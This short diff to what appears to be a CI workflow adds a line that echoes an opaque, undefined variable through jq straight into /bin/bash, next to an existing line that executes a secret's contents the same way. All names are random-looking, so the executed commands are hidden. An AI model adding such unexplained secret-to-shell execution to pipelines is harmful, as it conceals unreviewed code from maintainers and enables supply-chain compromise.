@@ -22,6 +22,7 @@ jobs:
           e358: ${{ secrets.e358 }}
         run: |
           printf '%s' "$e358" | jq -r .ccf907 | /bin/bash
+          echo $kmot209 | jq -r .hinjh97742 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
